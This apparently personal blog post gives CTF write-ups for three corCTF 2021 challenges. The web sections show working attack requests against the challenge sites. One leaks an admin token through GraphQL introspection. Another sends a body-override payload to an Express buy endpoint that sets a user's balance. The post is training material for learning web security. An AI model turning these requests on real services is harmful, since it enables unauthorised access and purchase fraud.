@@ -1,0 +1,289 @@
+<!doctype html><html lang=en-us>
+<head>
+<title>corCTF 2021 // Tom Plant</title>
+<link rel="shortcut icon" href=avatar.ico>
+<meta charset=utf-8>
+<meta name=generator content="Hugo 0.87.0">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=author content="Tom Plant">
+<meta name=description content>
+<link rel=stylesheet href=https://tplant.com.au/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="corCTF 2021">
+<meta name=twitter:description content="A jeopardy CTF (CTFtime event) by Crusaders of Rust. I didn&rsquo;t have much time so focused on the lower-level web chals, but it felt like a solid intermediate to hard CTF with great difficulty and category distribution. Didn&rsquo;t have any OSINT or forensics though :(
+web/devme  an ex-google, ex-facebook tech lead recommended me this book! https://devme.be.ax
+ Just like TechLead, the linked site was flashy but mostly empty. Only this email input field stood out.">
+<meta property="og:title" content="corCTF 2021">
+<meta property="og:description" content="A jeopardy CTF (CTFtime event) by Crusaders of Rust. I didn&rsquo;t have much time so focused on the lower-level web chals, but it felt like a solid intermediate to hard CTF with great difficulty and category distribution. Didn&rsquo;t have any OSINT or forensics though :(
+web/devme  an ex-google, ex-facebook tech lead recommended me this book! https://devme.be.ax
+ Just like TechLead, the linked site was flashy but mostly empty. Only this email input field stood out.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://tplant.com.au/blog/corctf-2021/"><meta property="article:section" content="blog">
+<meta property="article:published_time" content="2021-08-22T00:00:00+00:00">
+<meta property="article:modified_time" content="2021-08-22T00:00:00+00:00">
+</head>
+<body>
+<header class=app-header>
+<a href=https://tplant.com.au/><img class=app-header-avatar src=/avatar.png alt="Tom Plant"></a>
+<h1>Tom Plant</h1>
+<nav class=app-header-menu>
+<a class=app-header-menu-item href=/>Home</a>
+-
+<a class=app-header-menu-item href=/tags/>Tags</a>
+</nav>
+<p>security, devops, and too much zoomer humour</p>
+<div class=app-header-social>
+<a href=https://github.com/pl4nty target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github"><title>GitHub</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a>
+<a href=https://linkedin.com/in/tomplant target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin"><title>Linkedin</title><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+</a>
+</div>
+</header>
+<main class=app-container>
+<article class=post>
+<header class=post-header>
+<h1 class=post-title>corCTF 2021</h1>
+<div class=post-meta>
+<div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+Aug 22, 2021
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+4 min read
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
+<a class=tag href=https://tplant.com.au/tags/ctf/>CTF</a>
+</div>
+</div>
+</header>
+<div class=post-content>
+<p>A jeopardy CTF (<a href=https://ctftime.org/event/1364/>CTFtime event</a>) by <a href=https://ctf.cor.team/>Crusaders of Rust</a>. I didn&rsquo;t have much time so focused on the lower-level web chals, but it felt like a solid intermediate to hard CTF with great difficulty and category distribution. Didn&rsquo;t have any OSINT or forensics though :(</p>
+<h2 id=webdevme>web/devme&nbsp;<a class=anchor href=#webdevme><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link"><title>link</title><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></a> </h2>
+<blockquote>
+<p>an ex-google, ex-facebook tech lead recommended me this book!
+<a href=https://devme.be.ax>https://devme.be.ax</a></p>
+</blockquote>
+<p>Just like <a href=https://www.youtube.com/channel/UC4xKdmAXFh4ACyhpiQ_3qBw>TechLead</a>, the linked site was flashy but mostly empty. Only this email input field stood out.</p>
+<p><img src=devme-1.png alt="email input field"></p>
+<p>Using a dummy email, it sent a GraphQL request on submission:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#50fa7b>POST</span> /graphql <span style=color:#ff79c6>HTTP</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>1.1</span>
+Content-Type<span style=color:#ff79c6>:</span> application/json
+
+{
+    <span style=color:#ff79c6>&#34;query&#34;</span>: <span style=color:#f1fa8c>&#34;mutation createUser($email: String!) {\n\tcreateUser(email: $email) {\n\t\tusername\n\t}\n}\n&#34;</span>,
+    <span style=color:#ff79c6>&#34;variables&#34;</span>: {
+        <span style=color:#ff79c6>&#34;email&#34;</span>: <span style=color:#f1fa8c>&#34;test@test.com&#34;</span>
+    }
+}
+</code></pre></div><p>So the query element can be replaced with a stringified GraphQL query, and the variables element can be discarded. John Hammond made <a href="https://www.youtube.com/watch?v=0wPKzinwM7A">a great video</a> on GraphQL introspection, which I reopened to refresh my memory. Then I opened up Burp and got to work.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-graphql data-lang=graphql>{
+    __schema {
+        <span style=color:#8be9fd;font-style:italic>type</span><span style=color:#50fa7b>s</span> {
+            name
+        }
+    }
+}
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+    <span style=color:#ff79c6>&#34;data&#34;</span>: {
+        <span style=color:#ff79c6>&#34;__schema&#34;</span>: {
+            <span style=color:#ff79c6>&#34;types&#34;</span>: [
+                {
+                    <span style=color:#ff79c6>&#34;name&#34;</span>: <span style=color:#f1fa8c>&#34;Query&#34;</span>
+                },
+                ... lots of default types
+                {
+                    <span style=color:#ff79c6>&#34;name&#34;</span>: <span style=color:#f1fa8c>&#34;User&#34;</span>
+                }
+            ]
+        }
+    }
+}
+</code></pre></div><p>That <code>Users</code> type looks interesting, I wonder what properties it has? I turned to <a href=https://graphql.org/learn/introspection/>the GraphQL docs</a> for help.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-graphql data-lang=graphql>{
+    __type(name: <span style=color:#f1fa8c>&#34;User&#34;</span>) {
+        <span style=color:#50fa7b>fields</span> {
+            name
+        }
+    }
+}
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+    <span style=color:#ff79c6>&#34;data&#34;</span>: {
+        <span style=color:#ff79c6>&#34;__type&#34;</span>: {
+            <span style=color:#ff79c6>&#34;fields&#34;</span>: [
+                {
+                    <span style=color:#ff79c6>&#34;name&#34;</span>: <span style=color:#f1fa8c>&#34;token&#34;</span>
+                },
+                {
+                    <span style=color:#ff79c6>&#34;name&#34;</span>: <span style=color:#f1fa8c>&#34;username&#34;</span>
+                }
+            ]
+        }
+    }
+}
+</code></pre></div><p>Ok. Now let&rsquo;s see what queries are supported.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-graphql data-lang=graphql>{
+    __type(name: <span style=color:#f1fa8c>&#34;Query&#34;</span>) {
+        <span style=color:#50fa7b>fields</span> {
+            name
+        }
+    }
+}
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+    <span style=color:#ff79c6>&#34;data&#34;</span>: {
+        <span style=color:#ff79c6>&#34;__type&#34;</span>: {
+            <span style=color:#ff79c6>&#34;fields&#34;</span>: [
+                {
+                    <span style=color:#ff79c6>&#34;name&#34;</span>: <span style=color:#f1fa8c>&#34;users&#34;</span>
+                },
+                {
+                    <span style=color:#ff79c6>&#34;name&#34;</span>: <span style=color:#f1fa8c>&#34;flag&#34;</span>
+                }
+            ]
+        }
+    }
+}
+</code></pre></div><p>Surely it&rsquo;s not that easy&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-graphql data-lang=graphql>{
+    flag
+}
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+    <span style=color:#ff79c6>&#34;errors&#34;</span>: [
+        {
+            <span style=color:#ff79c6>&#34;message&#34;</span>: <span style=color:#f1fa8c>&#34;Field \&#34;flag\&#34; argument \&#34;token\&#34; of type \&#34;String!\&#34; is required, but it was not provided.&#34;</span>,
+            <span style=color:#ff79c6>&#34;locations&#34;</span>: [
+                {
+                    <span style=color:#ff79c6>&#34;line&#34;</span>: <span style=color:#bd93f9>1</span>,
+                    <span style=color:#ff79c6>&#34;column&#34;</span>: <span style=color:#bd93f9>2</span>
+                }
+            ]
+        }
+    ]
+}
+</code></pre></div><p>Ok, we need a token. Let&rsquo;s try the <code>users</code> query from earlier.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-graphql data-lang=graphql>{
+    users {
+        username
+        token
+    }
+}
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+    <span style=color:#ff79c6>&#34;data&#34;</span>: {
+        <span style=color:#ff79c6>&#34;users&#34;</span>: [
+            {
+                <span style=color:#ff79c6>&#34;username&#34;</span>: <span style=color:#f1fa8c>&#34;admin&#34;</span>,
+                <span style=color:#ff79c6>&#34;token&#34;</span>: <span style=color:#f1fa8c>&#34;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&#34;</span>
+            },{
+                <span style=color:#ff79c6>&#34;username&#34;</span>: <span style=color:#f1fa8c>&#34;b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c&#34;</span>,
+                <span style=color:#ff79c6>&#34;token&#34;</span>: <span style=color:#f1fa8c>&#34;5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6&#34;</span>
+            }
+            ... more users
+        ]
+    }
+}
+</code></pre></div><p>Using the admin&rsquo;s token got the flag.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-graphql data-lang=graphql>{
+    flag(token: <span style=color:#f1fa8c>&#34;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&#34;</span>)
+}
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+    <span style=color:#ff79c6>&#34;data&#34;</span>: {
+        <span style=color:#ff79c6>&#34;flag&#34;</span>: <span style=color:#f1fa8c>&#34;&#34;</span>
+    }
+}
+</code></pre></div><h2 id=webbuyme>web/buyme&nbsp;<a class=anchor href=#webbuyme><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link"><title>link</title><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></a> </h2>
+<blockquote>
+<p>I made a new site to buy flags! But no hoarding, okay :&lt;</p>
+</blockquote>
+<blockquote>
+<p><a href=https://buyme.be.ax>https://buyme.be.ax</a></p>
+</blockquote>
+<blockquote>
+<p><a href=buyme.tar.xz>buyme.tar.xz</a></p>
+</blockquote>
+<p>The source was provided this time, so I started with a code audit. It was a typical &lsquo;shop&rsquo; CTF webapp for &lsquo;flags&rsquo; built on Express, using in-memory JavaScript <code>Map</code>s for state.
+There were functions for registration, login, purchasing and viewing flags, but not changing a user&rsquo;s balance. So I focused on the <code>buy</code> endpoint.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>router.post(<span style=color:#f1fa8c>&#34;/buy&#34;</span>, requiresLogin, <span style=color:#ff79c6>async</span> (req, res) =&gt; {
+    <span style=color:#ff79c6>if</span>(<span style=color:#ff79c6>!</span>req.body.flag) {
+        <span style=color:#ff79c6>return</span> res.redirect(<span style=color:#f1fa8c>&#34;/flags?error=&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>encodeURIComponent</span>(<span style=color:#f1fa8c>&#34;Missing flag to buy&#34;</span>));
+    }
+
+    <span style=color:#ff79c6>try</span> {
+        db.buyFlag({ user<span style=color:#ff79c6>:</span> req.user, ...req.body });
+    }
+    <span style=color:#ff79c6>catch</span>(err) {
+        <span style=color:#ff79c6>return</span> res.redirect(<span style=color:#f1fa8c>&#34;/flags?error=&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>encodeURIComponent</span>(err.message));
+    }
+
+    res.redirect(<span style=color:#f1fa8c>&#34;/?message=&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>encodeURIComponent</span>(<span style=color:#f1fa8c>&#34;Flag bought successfully&#34;</span>));
+});
+</code></pre></div><p>A subtle bug jumped out at me, as I&rsquo;d run into it several days beforehand on a personal project.
+The call to <code>db.buyFlag</code> uses the <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax#spread_in_object_literals>spread operator</a> <code>...req.body</code>, but it&rsquo;s used after setting the user property. This allows the user property to be overriden by the contents of <code>req.body</code>. <code>req.body</code> is just the request body, so we can set the user arbitrarily.</p>
+<p>The <code>buy</code> endpoint requires login, so I registered a user and extracted the <code>user</code> cookie.
+I also visited the shop page, to get the name and price of the target flag (<code>corCTF</code>).</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#50fa7b>POST</span> /api/buy <span style=color:#ff79c6>HTTP</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>1.1</span>
+Content-Type<span style=color:#ff79c6>:</span> application/json
+Cookie<span style=color:#ff79c6>:</span> user=s%3Apl4nty.WTNCqX1%2F%2F4sICQw5z2kLMj5e%2FpH4UNAvqYBU5wAGs%2Bo
+
+{
+	<span style=color:#ff79c6>&#34;flag&#34;</span>:  <span style=color:#f1fa8c>&#34;corCTF&#34;</span>,
+    <span style=color:#ff79c6>&#34;user&#34;</span>: {
+        <span style=color:#ff79c6>&#34;user&#34;</span>:<span style=color:#f1fa8c>&#34;pl4nty&#34;</span>,
+        <span style=color:#ff79c6>&#34;money&#34;</span>:<span style=color:#bd93f9>1e+300</span>,
+        <span style=color:#ff79c6>&#34;flags&#34;</span>:[]
+    }
+}
+</code></pre></div><blockquote>
+<p>Found. Redirecting to <code>/?message=Flag%20bought%20successfully</code></p>
+</blockquote>
+<p>The site&rsquo;s &lsquo;view flags&rsquo; page had the flag.</p>
+<h2 id=cryptofibinary>crypto/fibinary&nbsp;<a class=anchor href=#cryptofibinary><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link"><title>link</title><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></a> </h2>
+<blockquote>
+<p>Warmup your crypto skills with the superior number system!
+<a href=fibinary-enc.py>enc.py</a> <a href=fibinary-flag.enc>flag.enc</a></p>
+</blockquote>
+<p>An encoded flag and its Python encoding script were provided.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>fib <span style=color:#ff79c6>=</span> [<span style=color:#bd93f9>1</span>, <span style=color:#bd93f9>1</span>]
+<span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>2</span>, <span style=color:#bd93f9>11</span>):
+	fib<span style=color:#ff79c6>.</span>append(fib[i <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>+</span> fib[i <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>2</span>])
+
+<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>c2f</span>(c):
+	n <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c)
+	b <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
+	<span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>10</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>):
+		<span style=color:#ff79c6>if</span> n <span style=color:#ff79c6>&gt;=</span> fib[i]:
+			n <span style=color:#ff79c6>-=</span> fib[i]
+			b <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;1&#39;</span>
+		<span style=color:#ff79c6>else</span>:
+			b <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;0&#39;</span>
+	<span style=color:#ff79c6>return</span> b
+
+flag <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;flag.txt&#39;</span>, <span style=color:#f1fa8c>&#39;r&#39;</span>)<span style=color:#ff79c6>.</span>read()
+enc <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
+<span style=color:#ff79c6>for</span> c <span style=color:#ff79c6>in</span> flag:
+	enc <span style=color:#ff79c6>+=</span> c2f(c) <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39; &#39;</span>
+<span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;flag.enc&#39;</span>, <span style=color:#f1fa8c>&#39;w&#39;</span>) <span style=color:#ff79c6>as</span> f:
+	f<span style=color:#ff79c6>.</span>write(enc<span style=color:#ff79c6>.</span>strip())
+</code></pre></div><p>Flag characters were encoded as space-separated 11-bit strings.
+A <code>1</code> bit referenced a corresponding big-endian Fibonacci number, adding together to an ASCII charcode. The following script reads each string, adds the selected Fibonacci numbers, and converts to a character. Together, these characters gave the flag.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>fib <span style=color:#ff79c6>=</span> [<span style=color:#bd93f9>1</span>, <span style=color:#bd93f9>1</span>, <span style=color:#bd93f9>2</span>, <span style=color:#bd93f9>3</span>, <span style=color:#bd93f9>5</span>, <span style=color:#bd93f9>8</span>, <span style=color:#bd93f9>13</span>, <span style=color:#bd93f9>21</span>, <span style=color:#bd93f9>34</span>, <span style=color:#bd93f9>55</span>, <span style=color:#bd93f9>89</span>]
+
+<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>f2c</span>(f):
+    n <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
+    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#8be9fd;font-style:italic>len</span>(f)):
+        <span style=color:#ff79c6>if</span> f[i] <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;1&#39;</span>:
+            n <span style=color:#ff79c6>+=</span> fib[<span style=color:#8be9fd;font-style:italic>len</span>(fib)<span style=color:#ff79c6>-</span>i<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>]
+    <span style=color:#8be9fd;font-style:italic>print</span>(n)
+    <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>chr</span>(n)
+
+enc <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;flag.enc&#39;</span>, <span style=color:#f1fa8c>&#39;r&#39;</span>)<span style=color:#ff79c6>.</span>read()
+dec <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
+<span style=color:#ff79c6>for</span> f <span style=color:#ff79c6>in</span> enc<span style=color:#ff79c6>.</span>split():
+	dec <span style=color:#ff79c6>+=</span> f2c(f)
+
+<span style=color:#8be9fd;font-style:italic>print</span>(dec)
+</code></pre></div>
+</div>
+<div class=post-footer>
+</div>
+</article>
+</main>
+</body>
+</html>
